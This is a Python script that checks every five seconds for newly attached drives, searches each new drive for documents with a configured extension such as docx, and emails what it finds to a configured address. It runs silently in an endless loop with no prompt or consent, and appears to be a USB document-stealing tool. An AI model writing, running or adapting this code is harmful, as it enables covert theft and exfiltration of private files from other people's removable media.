from os.path import exists
import os
import time
from datetime import datetime as dt
from os import listdir
from os.path import isfile, join
import config
import mail


def drives():
    drive_list = []
    for drive in range(ord('A'), ord('N')):
        if exists(chr(drive) + ':'):
            drive_list.append(chr(drive))
    return drive_list


def find_docx(direct='F', ):
    list_files = []
    for root, dirs, files in os.walk(direct + ':\\'):
        for file in files:
            if (file.endswith(config.file_ext)):
                list_files.append(os.path.join(root, file))

    return list_files


def disk_checker(list_drive_new=[]):
    for drive in range(ord('A'), ord('N')):
        if not exists(chr(drive) + ':'):
            if chr(drive) in list_drive_new:
                list_drive_new.remove(chr(drive))

        elif exists(chr(drive) + ':'):
            if (chr(drive) not in config.list_drive) and (chr(drive) not in list_drive_new):

                # if disk new, we`ll search docx file in drive
                list_drive_new.append(chr(drive))

                list_file = find_docx(chr(drive))
                if list_file != []:
                    mail.send_mail(config.fromaddr, config.toaddr, config.password, list_file)


while True:
    disk_checker()
    time.sleep(5)
